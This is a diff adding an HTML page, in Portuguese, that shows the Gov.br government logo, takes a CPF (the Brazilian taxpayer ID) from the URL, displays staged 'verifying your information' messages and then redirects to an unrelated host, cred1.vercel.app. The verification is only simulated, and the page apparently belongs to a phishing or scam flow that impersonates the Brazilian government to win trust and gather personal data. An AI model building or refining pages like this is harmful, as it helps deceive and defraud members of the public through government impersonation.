@@ -1,0 +1,60 @@
+
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Esperando...</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+      text-align: center;
+    }
+    .logo img {
+      width: 200px;
+      margin-bottom: 20px;
+    }
+    .message {
+      font-size: 20px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">
+    <img src="https://i.postimg.cc/g2hJGhFB/Gov-br-logo-svg.png" alt="Logo">
+  </div>
+  <div class="message" id="message">
+    Carregando... Aguarde, estamos verificando as informações.
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const params = new URLSearchParams(window.location.search);
+        const cpf = params.get('cpf');
+
+        if (!cpf) {
+            document.getElementById('message').innerHTML = "Erro: CPF não fornecido!";
+            return;
+        }
+
+        // Simulação de tempo de espera
+        setTimeout(function() {
+            document.getElementById('message').innerHTML = "Processando informações... Por favor, aguarde.";
+        }, 2000);
+
+        // Substituir com lógica de consulta, por exemplo, usando a API
+        // Caso queira manter um processo real, podemos substituir por um fetch ou chamada similar à anterior
+        setTimeout(function() {
+            // Atualize o caminho para um destino real
+            window.location.href = "https://cred1.vercel.app/success";  // Caminho de sucesso real após a verificação
+        }, 5000);  // Simulação de 5 segundos para processamento
+    });
+  </script>
+</body>
+</html>
